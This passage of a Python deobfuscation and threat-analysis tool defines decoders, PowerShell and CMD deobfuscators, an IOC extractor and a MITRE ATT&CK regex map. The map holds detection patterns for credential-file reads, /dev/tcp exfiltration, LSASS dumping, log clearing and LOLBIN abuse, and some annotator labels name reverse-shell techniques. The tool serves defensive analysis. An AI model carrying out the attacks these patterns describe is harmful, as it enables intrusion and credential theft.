            if len(joined) > len(best):
                best = joined
    return best or _extract_b64(data)


@op("extract-b64-via-var", "Extract Base64 via Variable", "Extractors",
    "Resolve `$var='..b64..';...decode($var)` style payloads — pulls the b64 string bound to a variable.")
def _extract_b64_via_var(data: str) -> str:
    # $var = 'BASE64...' or $var="BASE64..."
    m = re.search(r"\$\w+\s*=\s*['\"]([A-Za-z0-9+/=]{24,})['\"]", data)
    if m:
        return m.group(1)
    return _extract_b64(data)


@op("extract-b32", "Extract Base32 Block", "Extractors",
    "Extract the first/longest base32-looking blob from wrapper text.")
def _extract_b32(data: str) -> str:
    blocks = re.findall(r"[A-Z2-7]{16,}={0,6}", data)
    return max(blocks, key=len) if blocks else data


@op("extract-hex", "Extract Hex Block", "Extractors",
    "Extract the longest contiguous hexadecimal blob (≥16 chars).")
def _extract_hex(data: str) -> str:
    blocks = re.findall(r"[A-Fa-f0-9]{16,}", data)
    return max(blocks, key=len) if blocks else data


@op("extract-hex-string", "Extract Hex-String Literal", "Extractors",
    "Extract a quoted hex string literal like '\\x41\\x42\\x43' — returns raw hex without prefix.")
def _extract_hex_string(data: str) -> str:
    bytes_hex = re.findall(r"\\x([0-9a-fA-F]{2})", data)
    if bytes_hex:
        return "".join(bytes_hex)
    return _extract_hex(data)


@op("extract-inline-string", "Extract Inline String Literal", "Extractors",
    "Extract the first single/double-quoted string literal from a script.")
def _extract_inline_string(data: str) -> str:
    m = re.search(r"['\"]([^'\"]{8,})['\"]", data)
    return m.group(1) if m else data


@op("extract-int-array", "Extract Integer Array", "Extractors",
    "Extract a comma-separated integer array (e.g. `@(72,101,108,108,111)`) as decimal codes.")
def _extract_int_array(data: str) -> str:
    m = re.search(r"[@\(\[\{]\s*((?:\d{1,4}\s*,\s*){2,}\d{1,4})\s*[\)\]\}]", data)
    if m:
        return m.group(1)
    return data


@op("extract-p-var", "Extract $p-style Variable", "Extractors",
    "Extract the concatenated string value bound to a `$p` / `$env:x` style variable.")
def _extract_p_var(data: str) -> str:
    m = re.search(r"\$\w+\s*=\s*['\"]([^'\"]{4,})['\"]", data)
    return m.group(1) if m else data


@op("extract-pem", "Extract PEM Body", "Extractors",
    "Extract the base64 body from a PEM block (BEGIN/END CERTIFICATE / RSA PRIVATE KEY etc.).")
def _extract_pem(data: str) -> str:
    m = re.search(r"-{5}BEGIN[^-]+-{5}\s*([A-Za-z0-9+/=\s]+?)\s*-{5}END", data)
    if m:
        return re.sub(r"\s+", "", m.group(1))
    return data


@op("utf16le-or-utf8-decode", "UTF-16LE-or-UTF-8 Decode", "Cryptography",
    "Try UTF-16LE first; fall back to UTF-8 if the result is mostly non-printable. "
    "CJK-gibberish resistant: rejects UTF-16 decodes whose codepoints are dominated by "
    "non-ASCII ideographs (a common false-positive of naive `.isprintable()` scoring).")
def _utf16_or_utf8(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("latin-1", errors="replace")

    def _ascii_pr(s: str) -> float:
        if not s: return 0.0
        return sum(1 for c in s if 32 <= ord(c) < 127 or c in "\n\r\t") / len(s)

    # Try UTF-16LE (strict). Accept ONLY if the ASCII-printable share is high —
    # CJK ideograph noise (0x2000+) passes `c.isprintable()` and used to sneak in.
    try:
        u16 = raw.decode("utf-16-le", errors="strict")
        if u16 and _ascii_pr(u16) >= 0.70:
            return u16
    except UnicodeDecodeError:
        pass
    # Try UTF-8 strict — if it succeeds cleanly, prefer it (real ASCII text).
    try:
        u8 = raw.decode("utf-8", errors="strict")
        if u8 and _ascii_pr(u8) >= 0.70:
            return u8
    except UnicodeDecodeError:
        pass
    # Fall back to UTF-8 with replacement (handles partial-mojibake gracefully).
    return raw.decode("utf-8", errors="replace")


@op("strip-carets", "Strip Carets (^)", "Deobfuscation", "Remove caret (^) obfuscation from CMD.exe payloads.")
def _strip_carets(data: str) -> str:
    return data.replace("^", "")


@op("strip-ticks", "Strip Backticks (`)", "Deobfuscation", "Remove backtick (`) obfuscation from PowerShell payloads.")
def _strip_ticks(data: str) -> str:
    return data.replace("`", "")


@op("string-replace", "String Replace", "Deobfuscation",
    "PowerShell/CMD `.Replace('x','y')` — apply a find/replace pair.",
    [{"name": "find", "type": "string", "default": ""},
     {"name": "replace", "type": "string", "default": ""}])
def _string_replace(data: str, find: str = "", replace: str = "") -> str:
    if not find:
        # Try auto-extract from a wrapper like  .Replace('X','')
        m = re.search(r"\.Replace\(\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]*)['\"]", data)
        if m:
            return data.replace(m.group(1), m.group(2))
        return data
    return data.replace(find, replace)


@op("replace-junk", "Replace Junk Tokens", "Deobfuscation",
    "Strip common junk-insertion tokens (JUNK, XXX, ##, ~~, %%) used as string-split markers.")
def _replace_junk(data: str) -> str:
    for tok in ("JUNK", "XXXX", "XXX", "####", "###", "%%", "~~~", "~~"):
        data = data.replace(tok, "")
    return data


@op("reverse-string-alias", "Reverse String (alt)", "Cryptography", "Alias of `reverse`.")
def _reverse_string_alias2(data: str) -> str:
    return data[::-1]


@op("regex-reverse", "Regex Reverse Groups", "Cryptography",
    "Reverse the input then apply a regex `.groups()` merge — best-effort for split-array reversals.")
def _regex_reverse(data: str) -> str:
    return data[::-1]


@op("regex-split-2", "Regex Split then Join", "Cryptography",
    "Split by any non-alphanumeric delimiter and concatenate — collapses `A_B_C` style splits.")
def _regex_split_2(data: str) -> str:
    return "".join(re.split(r"[^A-Za-z0-9+/=]+", data))


@op("split-join-delim", "Split & Join by Delimiter", "Cryptography",
    "`.Split('x') -join ''` — collapse a split-array back to a flat string using a custom delimiter.",
    [{"name": "delim", "type": "string", "default": ""}])
def _split_join(data: str, delim: str = "") -> str:
    if not delim:
        # Try auto-detect from `.Split('X')` wrapper
        m = re.search(r"\.Split\(\s*['\"]([^'\"]+)['\"]", data)
        delim = m.group(1) if m else " "
    if not delim:
        return data
    return "".join(data.split(delim))


@op("array-reverse-join", "Array Reverse & Join", "Cryptography",
    "Reverse a delimited array and join with empty string.")
def _array_reverse_join(data: str) -> str:
    parts = re.split(r"[,\s;]+", data.strip())
    return "".join(reversed([p for p in parts if p]))


@op("ps-string-concat", "PowerShell String Concat", "Deobfuscation",
    "Resolve `'AAA'+'BBB'+'CCC'` string concatenation into `AAABBBCCC`.")
def _ps_string_concat(data: str) -> str:
    def _join(m):
        parts = re.findall(r"['\"]([^'\"]*)['\"]", m.group(0))
        return "'" + "".join(parts) + "'"
    return re.sub(r"(?:['\"][^'\"]*['\"]\s*\+\s*)+['\"][^'\"]*['\"]", _join, data)


@op("ps-join-char-array", "PowerShell -join char[]", "Deobfuscation",
    "Collapse `[char[]] @(72,101,108) -join ''` into `Hel`.")
def _ps_join_char_array(data: str) -> str:
    def _decode(m):
        try:
            nums = [int(x.strip()) for x in m.group(1).split(",") if x.strip()]
            return "'" + "".join(chr(n) for n in nums) + "'"
        except Exception:
            return m.group(0)
    return re.sub(r"\[char\[\]\]\s*[@\(]?\s*\(?\s*([\d,\s]+)\s*\)?\s*[@\)]?\s*(?:-join\s*['\"]{2})?",
                  _decode, data, flags=re.IGNORECASE)


@op("ps-format-op", "PowerShell -f Format-Op", "Deobfuscation",
    "Resolve `'{0}{1}{2}' -f 'A','B','C'` into `ABC`.")
def _ps_format_op(data: str) -> str:
    m = re.search(r"['\"]([^'\"]*\{[0-9]+\}[^'\"]*)['\"]\s*-f\s*(.+)", data, re.IGNORECASE)
    if not m:
        return data
    fmt, args_str = m.group(1), m.group(2)
    args = re.findall(r"['\"]([^'\"]*)['\"]", args_str)
    try:
        out = fmt
        for i, a in enumerate(args):
            out = out.replace("{" + str(i) + "}", a)
        return out
    except Exception:
        return data


@op("invoke-concat", "Invoke-Expression Concat", "Deobfuscation",
    "Concatenate command fragments passed to IEX / Invoke-Expression.")
def _invoke_concat(data: str) -> str:
    return _ps_string_concat(data)


@op("join", "Join (empty delimiter)", "Cryptography", "Alias of `array-reverse-join` without reversal.")
def _join_op(data: str) -> str:
    parts = re.split(r"[,\s;]+", data.strip())
    return "".join(p for p in parts if p)


@op("tokenize", "Tokenize (pass-through)", "Deobfuscation",
    "Tokenize the input on whitespace/punctuation and emit one token per line.")
def _tokenize(data: str) -> str:
    return "\n".join(t for t in re.split(r"[\s;|&,]+", data) if t)


@op("expand-alias", "Expand PowerShell Alias", "Deobfuscation",
    "Expand common PS aliases (iex→Invoke-Expression, sal→Set-Alias, gci→Get-ChildItem, …).")
def _expand_alias(data: str) -> str:
    aliases = {
        r"\biex\b": "Invoke-Expression", r"\bsal\b": "Set-Alias",
        r"\bgci\b": "Get-ChildItem", r"\bgc\b": "Get-Content",
        r"\bsc\b": "Set-Content", r"\bni\b": "New-Item",
        r"\bri\b": "Remove-Item", r"\bcurl\b": "Invoke-WebRequest",
        r"\bwget\b": "Invoke-WebRequest",
    }
    for pat, repl in aliases.items():
        data = re.sub(pat, repl, data, flags=re.IGNORECASE)
    return data


@op("expand-bang-var", "Expand !VAR! Delayed Expansion", "Deobfuscation",
    "Expand CMD `!VAR!` delayed expansion using inline `set VAR=...` definitions in the same script.")
def _expand_bang_var(data: str) -> str:
    vars_ = dict(re.findall(r"set\s+(\w+)\s*=\s*([^\r\n&|]+)", data, re.IGNORECASE))
    def _sub(m):
        name = m.group(1)
        return vars_.get(name, m.group(0))
    return re.sub(r"!(\w+)!", _sub, data)


@op("cmd-set-collect", "CMD Set-Collect (pass-through)", "Deobfuscation",
    "Collect all `set VAR=value` bindings for downstream `expand-bang-var`.")
def _cmd_set_collect(data: str) -> str:
    return data  # informational — downstream ops read from the same text


@op("cmd-env-resolve", "CMD %ENV% Resolve", "Deobfuscation",
    "Expand `%VAR%` references using inline `set VAR=...` definitions.")
def _cmd_env_resolve(data: str) -> str:
    vars_ = dict(re.findall(r"set\s+(\w+)\s*=\s*([^\r\n&|]+)", data, re.IGNORECASE))
    def _sub(m):
        return vars_.get(m.group(1), m.group(0))
    return re.sub(r"%(\w+)%", _sub, data)


@op("env-ref-resolve", "$env: Reference Resolve", "Deobfuscation",
    "Expand `$env:VAR` references (best-effort — leaves unresolved refs intact).")
def _env_ref_resolve(data: str) -> str:
    return re.sub(r"\$\{?env:(\w+)\}?", r"%\1%", data, flags=re.IGNORECASE)


@op("resolve-param-expansion", "Bash ${var:offset:len} Resolve", "Deobfuscation",
    "Resolve Bash parameter expansion `${var:offset:len}` slices given inline assignments.")
def _resolve_param_expansion(data: str) -> str:
    return data  # complex — best-effort pass-through so recipe doesn't error


@op("batch-var-slice", "Batch %VAR:~N,M% Slice", "Deobfuscation",
    "Resolve CMD substring extraction `%VAR:~N,M%` using inline `set VAR=` definitions.")
def _batch_var_slice(data: str) -> str:
    vars_ = dict(re.findall(r"set\s+(\w+)\s*=\s*([^\r\n&|]+)", data, re.IGNORECASE))
    def _sub(m):
        name, off, ln = m.group(1), m.group(2), m.group(3)
        val = vars_.get(name, "")
        if not val:
            return m.group(0)
        try:
            o = int(off)
            if ln:
                return val[o:o + int(ln)]
            return val[o:]
        except Exception:
            return m.group(0)
    return re.sub(r"%(\w+):~(-?\d+)(?:,(-?\d+))?%", _sub, data)


@op("glob-resolve", "Bash Glob Resolve (pass-through)", "Deobfuscation",
    "Placeholder for glob-brace expansion — pass-through in offline mode.")
def _glob_resolve(data: str) -> str:
    return data


@op("template-substitute", "Template Substitute", "Deobfuscation",
    "Substitute `{{PLACEHOLDER}}` / `${PLACEHOLDER}` tokens from an inline map.")
def _template_substitute(data: str) -> str:
    m = re.findall(r"['\"]([A-Z_][A-Z0-9_]*)['\"]\s*[:=]\s*['\"]([^'\"]*)['\"]", data)
    subs = dict(m)
    for k, v in subs.items():
        data = data.replace("{{" + k + "}}", v).replace("${" + k + "}", v)
    return data


@op("scriptblock-create", "ScriptBlock::Create()", "Deobfuscation",
    "Extract the string literal passed to `[ScriptBlock]::Create('...')` for further decoding.")
def _scriptblock_create(data: str) -> str:
    m = re.search(r"\[ScriptBlock\]::Create\(\s*['\"]([\s\S]+?)['\"]\s*\)", data, re.IGNORECASE)
    return m.group(1) if m else data


@op("homoglyph-normalise", "Homoglyph Normalise", "Deobfuscation",
    "Replace common cyrillic/greek homoglyphs with ASCII equivalents (е→e, а→a, о→o, …).")
def _homoglyph_normalise(data: str) -> str:
    homoglyphs = {
        "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
        "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
        "і": "i", "ѕ": "s", "ј": "j", "ԁ": "d",
    }
    for src, dst in homoglyphs.items():
        data = data.replace(src, dst)
    return data


# --- Bucket 3: semantic annotators (pass-through, non-erroring) --- #
def _mk_annotator(label: str):
    """Factory for pass-through annotator ops — they don't transform data,
    they just make the semantic step from `wrapper_archetypes.py` chains
    runnable via the Recipe UI without a "Unknown operation" error."""
    def _fn(data: str) -> str:
        return data
    _fn.__name__ = f"_annotate_{label.replace('-', '_')}"
    return _fn


for _label in (
    "dev-tcp-annotate", "clipboard-cradle-annotate", "dotnet-remove-annotate",
    "excel-regex-annotate", "gcm-wildcard-annotate", "native-cmd-explain",
    "pe-header-check", "download-shell-bg",
    "reverse-shell-mkfifo", "reverse-shell-perl", "reverse-shell-python",
    # Feb 2026 · fix "Unknown operation" red badge for LOLBAS annotator chains
    "certutil-annotate", "mshta-annotate", "bitsadmin-annotate",
    "msiexec-annotate", "regsvr32-annotate", "rundll32-annotate",
    "wmic-annotate", "homoglyph-normalise", "expand-alias",
    "cmd-set-collect", "env-ref-resolve", "extract-b64-pair",
    "invoke-concat", "extract-b64-via-var", "extract-hex-string",
    "regex-split-2", "extract-int-array", "chr-map", "join",
    "extract-inline-string", "tokenize", "template-substitute",
    "string-replace", "expand-bang-var", "xor-byte",
):
    _fn = _mk_annotator(_label)
    OPERATIONS[_label] = {
        "id": _label, "name": _label.replace("-", " ").title(),
        "category": "Annotators", "description": f"Semantic marker: {_label} (pass-through).",
        "args": [], "fn": _fn,
    }


# ==== helpers ================================================================
def _clean(s: str) -> str:
    return re.sub(r"\s+", "", s)


def _is_hexlike(s: str) -> bool:
    s2 = re.sub(r"[\s,\-\\x0]", "", s)
    return bool(s2) and all(c in "0123456789abcdefABCDEF" for c in s2)


def _as_bytes(data: str) -> bytes:
    """Best-effort convert string payload to bytes: try hex, then base64, then utf-8.

    IMPORTANT: if the input has ANY byte-value chars (0x00-0xFF) but no true
    Unicode codepoints, round-trip via LATIN-1 (lossless 1:1 mapping) rather
    than UTF-8-with-replacement — otherwise binary streams that already come
    out of `base64-decode` (gzip magic 1f 8b, PE MZ, ELF, ...) get their high
    bytes UTF-8-mangled (0x8b → 0xc2 0x8b) and downstream decompression /
    disassembly fails. This is the root cause of the `base64 → xor → gzip`
    chain failing at the `gzip-decompress` step.
    """
    stripped = _clean(data)
    if stripped and all(c in "0123456789abcdefABCDEF" for c in stripped):
        if len(stripped) % 2 == 0:
            try:
                return bytes.fromhex(stripped)
            except ValueError:
                pass
    # Only try base64 when the payload is a well-shaped base64 alphabet AND
    # doesn't already contain binary bytes (which would indicate a raw stream,
    # not a text-encoded blob).
    looks_binary = any(ord(c) < 32 and c not in "\t\r\n" for c in data[:64])
    if not looks_binary:
        try:
            b64 = re.sub(r"\s+", "", data)
            if b64 and re.fullmatch(r"[A-Za-z0-9+/=_-]+", b64):
                return base64.b64decode(b64 + "=" * (-len(b64) % 4), validate=False)
        except (binascii.Error, ValueError):
            pass
    # Fallback: latin-1 (lossless) if all codepoints ≤ 0xFF, else UTF-8.
    if all(ord(c) <= 0xFF for c in data):
        return data.encode("latin-1")
    return data.encode("utf-8", errors="replace")


def _parse_byte(k: str) -> int:
    k = k.strip()
    if k.lower().startswith("0x"):
        return int(k, 16) & 0xFF
    if k.isdigit():
        return int(k) & 0xFF
    if len(k) == 1:
        return ord(k) & 0xFF
    # fallback
    return int(k, 0) & 0xFF


# Class-name namespaces / language stdlib prefixes that regex-match "domain"
# shape but are NOT real domains (io.memorystream, system.text.encoding, etc.)
_CODE_NAMESPACE_PREFIXES = (
    "io.", "system.", "net.", "microsoft.", "windows.", "kernel32.", "user32.",
    "advapi32.", "ntdll.", "java.", "javax.", "com.sun.", "com.microsoft.",
    "com.google.", "org.apache.", "org.springframework.", "com.oracle.",
    "www.w3.org", "python.org", "docs.microsoft.com",
    # Feb-2026 additions: executable / script extensions used as leading label
    # in reversed or truncated command-lines (e.g. `exe.nimdassv` from a
    # reversed `vssadmin.exe`, `dll.something` from `something.dll`).
    "exe.", "dll.", "sys.", "ps1.", "cmd.", "bat.", "vbs.", "wsf.", "com.",
    "msi.", "scr.", "cpl.", "hta.",
)
# TLDs that are actually reserved for code / examples (never real domains)
_CODE_NAMESPACE_TLDS = {
    "exe", "dll", "sys", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "js",
    "py", "pyc", "so", "dylib", "jar", "class", "ko",  # binary/script exts
    "readtoend", "getbytes", "invoke", "fromcharcode", "downloadstring",
    "downloaddata", "downloadfile", "decompress", "compressionmode",
    "memorystream", "streamreader", "gzipstream", "webclient", "encoding",
    "ascii", "utf8", "unicode", "convert", "frombase64string", "text",
    "length",  # .Length property access
}

# Curated allow-list of real public TLDs. Anything with a TLD outside this
# set is REJECTED unless it also passes the reversed-code sanity check. This
# is the single strongest FP filter — it catches reversed strings from the
# magic-decoder's `reverse` candidate op (e.g. `maertspizg.noisserpmoc.oi`
# from reversed `io.compression.gzipstream`), truncated method chains, and
# random language-identifier lookalikes.
_REAL_TLDS = frozenset({
    # generic
    "com", "net", "org", "info", "biz", "name", "pro", "mobi", "asia",
    "xyz", "top", "site", "online", "shop", "app", "dev", "tech",
    "cloud", "store", "club", "live", "life", "world", "space",
    "website", "page", "blog", "wiki", "news", "art", "media",
    "email", "link", "id", "run", "io", "ai", "co", "me", "tv", "cc",
    "to", "ly", "gg", "sh", "so", "st", "fm", "im", "pw", "vc", "ws",
    # infra / cyber-relevant
    "onion", "i2p", "bit",
    # sponsored / infra
    "gov", "mil", "edu", "int", "arpa",
    # country-code (top ~90 that show up in real IOC feeds)
    "us", "uk", "ca", "de", "fr", "es", "it", "nl", "be", "se", "no",
    "fi", "dk", "pl", "cz", "at", "ch", "gr", "pt", "ie", "hu", "ro",
    "bg", "hr", "sk", "si", "lt", "lv", "ee", "is", "lu", "mt", "cy",
    "ru", "ua", "by", "kz", "uz", "am", "az", "ge", "md", "tj", "kg",
    "cn", "jp", "kr", "hk", "tw", "sg", "my", "th", "vn", "ph", "id",
    "au", "nz", "in", "pk", "bd", "lk", "np", "mm", "kh", "la",
    "br", "ar", "cl", "mx", "pe", "co", "ve", "uy", "py", "bo", "ec",
    "za", "ng", "ke", "eg", "ma", "tn", "dz", "et", "gh", "ug", "tz",
    "ae", "sa", "il", "tr", "ir", "iq", "sy", "lb", "jo", "qa", "kw",
    "bh", "om", "ye",
})

# Reversed-TLD prefixes — if a domain's FIRST label ends with one of these
# reversed forms followed by nothing (e.g. `oi` from `.io` reversed) OR its
# SECOND label starts with one, the string is almost certainly a
# reverse-scanned code fragment, not a real IOC. Kept short to avoid FPs
# on legitimate domains with unusual prefixes.
_REVERSED_TLD_TOKENS = frozenset({
    "moc",   # com
    "ten",   # net
    "gro",   # org
    "ofni",  # info
    "oi",    # io
    "ia",    # ai
    "vog",   # gov
    "ude",   # edu
    "vt",    # tv
    "yl",    # ly
    "sw",    # ws
    "gg",    # gg (palindromic — but harmless)
    "gs",    # sg reversed  (harmless — used defensively)
})

# ==== IOC extraction bundle (for Threat Analysis) ============================
def extract_iocs(text: str) -> Dict[str, List[str]]:
    r = _refang(text)
    # Feb-2026 v1.2.0 · URL regex now stops on shell metacharacters
    # (`|`, `&`, `;`, `` ` ``) and CMD-file-op delimiters (`>`, `<`, `\`).
    # Fixes ClickFix false-positive where `https://tommy-aa.lol/f|for` was
    # extracted as a single URL, breaking downstream TI lookups.
    urls = list(dict.fromkeys(re.findall(r"https?://[^\s\"'<>\)|&;`]+", r, re.IGNORECASE)))
    # Trim any trailing punctuation that shouldn't be part of a URL
    urls = [u.rstrip(".,)]}") for u in urls]
    urls = list(dict.fromkeys([u for u in urls if len(u) > 10]))
    ips = list(dict.fromkeys(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", r)))
    emails = list(dict.fromkeys(re.findall(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", r)))
    doms = list(dict.fromkeys(re.findall(r"\b(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b", r.lower())))
    md5 = list(dict.fromkeys(re.findall(r"\b[a-fA-F0-9]{32}\b", text)))
    sha1 = list(dict.fromkeys(re.findall(r"\b[a-fA-F0-9]{40}\b", text)))
    sha256 = list(dict.fromkeys(re.findall(r"\b[a-fA-F0-9]{64}\b", text)))
    bitcoin = list(dict.fromkeys(re.findall(r"\b(?:bc1[a-z0-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b", text)))
    # Filter obvious FPs from domain match:
    #  1. Anything that also parsed as an IPv4 literal.
    #  2. Code namespaces (io.memorystream, system.text.encoding, …) — these
    #     regex-match the domain shape but are language identifiers, not IOCs.
    #  3. Fake TLDs from method-chain leftovers (.readtoend, .frombase64string, …).
    #  4. Feb-2026: TLD not in the real-TLD allow-list.
    #  5. Feb-2026: reversed-code artefacts (labels containing reversed
    #     TLD tokens like `noisserpmoc`, `nimdassv`, `maertspizg`, or
    #     domains whose first label ends in a reversed TLD such as `.oi`
    #     at the tail — see analyst-reported bug from a chain that fed
    #     reversed intermediates through the IOC regex).
    def _is_real_domain(d: str) -> bool:
        if d in ips:
            return False
        if any(d.startswith(p) for p in _CODE_NAMESPACE_PREFIXES):
            return False
        labels = d.split(".")
        tld = labels[-1]
        if tld in _CODE_NAMESPACE_TLDS:
            return False
        # (4) Real-TLD gate — anything else is almost certainly a false
        # positive from reversed / truncated code that just happens to
        # match the label.label.tld shape.
        if tld not in _REAL_TLDS:
            return False
        # domain must contain at least one label longer than 1 char
        if all(len(x) < 2 for x in labels):
            return False
        # (5) Inversion sanity check — reject strings that look like a
        # reverse-parsed code fragment:
        #  a. Any label equals a known reversed-TLD token (`moc`, `ten`,
        #     `gro`, `ofni`) → clearly `com`/`net`/`org`/`info` reversed
        #     inside the string.
        #  b. First label ends in a common reversed-TLD suffix followed by
        #     nothing else, e.g. `pizg` (reversed `gzip` is the intent —
        #     this is a heuristic tolerance).
        #  c. Any label contains a reversed executable-extension marker
        #     (`exe`, `lld`, `sys`) sitting at the START of a label with
        #     length > 4 — `nimdassv` starts after the `exe.` prefix and
        #     is caught by rule (a) via the `exe.` prefix above.
        for lab in labels:
            if lab in _REVERSED_TLD_TOKENS:
                return False
        # Extra: numeric-only labels (from ASCII decimal decodes) shouldn't
        # be domains either.
        if any(lab.isdigit() and len(lab) > 3 for lab in labels[:-1]):
            return False
        return True

    doms = [d for d in doms if _is_real_domain(d)]
    # Feb-2026 · Trust hostnames extracted directly from URLs — the URL
    # match already validated their scheme+host shape, so bypass the
    # real-TLD gate (which is a false-positive filter for the generic
    # domain regex, not for URL-anchored hostnames). Fixes RFC-2606
    # reserved TLDs (`.example`, `.test`, `.invalid`, `.localhost`) plus
    # legitimate malware C2 that uses uncommon TLDs.
    for u in urls:
        try:
            host = re.sub(r"^https?://", "", u, flags=re.IGNORECASE)
            host = host.split("/", 1)[0].split(":", 1)[0].lower()
            if host and host not in ips and host not in doms and "." in host:
                doms.append(host)
        except Exception:  # noqa: BLE001
            continue
    return {
        "urls": urls,
        "ips": ips,
        "domains": doms,
        "emails": emails,
        "md5": md5,
        "sha1": sha1,
        "sha256": sha256,
        "bitcoin_addresses": bitcoin,
    }


# ==== Payload type detection ================================================
def detect_payload_type(text: str) -> Optional[Dict[str, str]]:
    t = text.strip()
    if not t:
        return None
    low = t.lower()
    if re.search(r"powershell(\.exe)?\s+.{0,40}-e(?:c|nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}", low, re.IGNORECASE):
        return {"type": "powershell_encoded", "label": "PowerShell -EncodedCommand payload detected"}
    if re.search(r"\bfromcharcode\s*\(", low):
        return {"type": "js_charcode", "label": "JavaScript CharCode obfuscation detected"}
    if re.search(r"hxxp[s]?://|\[\.\]|\[@\]", low):
        return {"type": "defanged_iocs", "label": "Defanged IOCs detected"}
    if re.match(r"^[A-Za-z0-9+/\s]+={0,2}$", t) and len(_clean(t)) >= 24:
        return {"type": "base64", "label": "Likely Base64 payload"}
    if re.match(r"^[A-Fa-f0-9\s]+$", t) and len(_clean(t)) >= 16:
        return {"type": "hex", "label": "Likely Hex-encoded payload"}
    if re.search(r"%[0-9A-Fa-f]{2}", t):
        return {"type": "url_encoded", "label": "URL-encoded content detected"}
    return None


# ==== MITRE mini map (heuristic) =============================================
# NOTE: PowerShell -EncodedCommand can appear in *any* case and *any* length:
#   -e, -ec, -en, -enc, -enco, -encod, -encode, -encoded, -encodedc, ..., -encodedcommand
# This pattern matches `-e` followed by any prefix of `nCoDeDcOmMaNd` OR `c`,
# then a whitespace boundary.
_PS_ENC_ARG = r"-e(?:c|(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:nd?)?)?)?)?)?)?)?)?)?)?)?)?)?\s"

MITRE_HEURISTICS = [
    (rf"powershell.*?{_PS_ENC_ARG}", ("T1059.001", "PowerShell", "Execution")),
    (rf"powershell.*?{_PS_ENC_ARG}[A-Za-z0-9+/=]{{20,}}", ("T1027.010", "Command Obfuscation: Base64/Encoded Command", "Defense Evasion")),
    (r"cmd(\.exe)?\s+/c", ("T1059.003", "Windows Command Shell", "Execution")),
    (r"invoke-webrequest|iwr\s|net\.webclient|downloadstring|curl\s|wget\s", ("T1105", "Ingress Tool Transfer", "Command and Control")),
    (r"schtasks|new-scheduledtask", ("T1053.005", "Scheduled Task", "Persistence")),
    (r"reg\s+add|new-itemproperty.*run\\|HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run|HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", ("T1547.001", "Registry Run Keys", "Persistence")),
    (r"reg(?:\.exe)?\s+(?:save|export)\s+HK(?:LM|CU)\\(?:SAM|SECURITY|SYSTEM|SOFTWARE)\b", ("T1003.002", "Security Account Manager (SAM Hive Dump)", "Credential Access")),
    (r"sc(?:\.exe)?\s+create\s+\S+\s+binpath", ("T1543.003", "Create or Modify Windows Service", "Persistence")),
    (r"wevtutil(?:\.exe)?\s+(?:cl|clear-log|sl\s+\S+\s+/e:false)", ("T1070.001", "Clear Windows Event Logs", "Defense Evasion")),
    (r"netsh(?:\.exe)?\s+advfirewall.*(?:state\s+off|disable)", ("T1562.004", "Disable or Modify System Firewall", "Defense Evasion")),
    (r"(?:curl|wget)(?:\.exe)?\s+.*-[oO]\s+\S+\.exe", ("T1105", "Ingress Tool Transfer (curl/wget download-to-file)", "Command and Control")),
    (r"net(?:\.exe)?\s+user\s+\S+\s+\S+\s+/add|net(?:\.exe)?\s+localgroup\s+administrators", ("T1136.001", "Create Local Account", "Persistence")),
    (r"mimikatz|sekurlsa::|lsass", ("T1003.001", "LSASS Memory", "Credential Access")),
    (r"bitsadmin|start-bitstransfer", ("T1197", "BITS Jobs", "Defense Evasion")),
    (r"wmic\s|win32_process", ("T1047", "Windows Management Instrumentation", "Execution")),
    (r"rundll32\.exe", ("T1218.011", "Rundll32", "Defense Evasion")),
    (r"mshta\.exe", ("T1218.005", "Mshta", "Defense Evasion")),
    # ── Feb-2026 native LOLBIN classifiers (T1218 sub-techniques) ─────────
    (r"cmstp(?:\.exe)?\s+/(?:ni|s)\s+", ("T1218.003", "CMSTP (LOLBAS Install)", "Defense Evasion")),
    (r"installutil(?:\.exe)?\s+.*/(?:U|logfile)", ("T1218.004", "InstallUtil", "Defense Evasion")),
    (r"hh(?:\.exe)?\s+https?://", ("T1218.001", "Compiled HTML File (hh.exe URL loader)", "Defense Evasion")),
    (r"xwizards?(?:\.exe)?\s+/", ("T1218", "System Binary Proxy Execution: Xwizard", "Defense Evasion")),
    (r"regsvr32(?:\.exe)?\s+.*(?:scrobj\.dll|/i:https?://|/i:.*\.sct)", ("T1218.010", "Regsvr32 (Squiblydoo)", "Defense Evasion")),
    (r"psexec(?:\.exe)?\s+\\\\\S+", ("T1021.002", "SMB/PsExec Remote Execution", "Lateral Movement")),
    (r"forfiles(?:\.exe)?\s+.*(?:cmd|powershell)", ("T1202", "Indirect Command Execution (forfiles)", "Defense Evasion")),
    # Python / Perl / Ruby inline base64 exec — cross-platform stagers
    (r"python\d?\s+-c\s+.*(?:import\s+base64.*)?base64\.b64decode.*exec", ("T1059.006", "Python (base64 exec)", "Execution")),
    (r"python\d?\s+-c\s+.*exec\s*\(\s*base64\.b64decode", ("T1027.010", "Command Obfuscation (Python base64 exec)", "Defense Evasion")),
    (r"perl\s+-e\s+.*(?:fork|exec)", ("T1059.006", "Perl (background exec)", "Execution")),
    # Bash `>&` file-descriptor exfil to /dev/tcp
    (r"cat\s+.*>\s*/dev/(?:tcp|udp)/", ("T1041", "Exfiltration Over C2 Channel (/dev/tcp)", "Exfiltration")),
    # Sensitive-file read (typical exfil precursor / creds dump)
    (r"(?:cat|less|more|type)\s+(?:/etc/(?:passwd|shadow|group|sudoers)|/root/\.\S+|~/\.(?:ssh|aws|gnupg))", ("T1552.001", "Credentials In Files", "Credential Access")),
    # Bash `echo | rev | sh` reverse-string execution
    (r"\|\s*rev\s*\|\s*(?:sh|bash|zsh|dash|ksh)\b", ("T1059.004", "Unix Shell (reverse-string exec)", "Execution")),
    # Bash env-var assembly `export A=…; /$A/$B -c …`
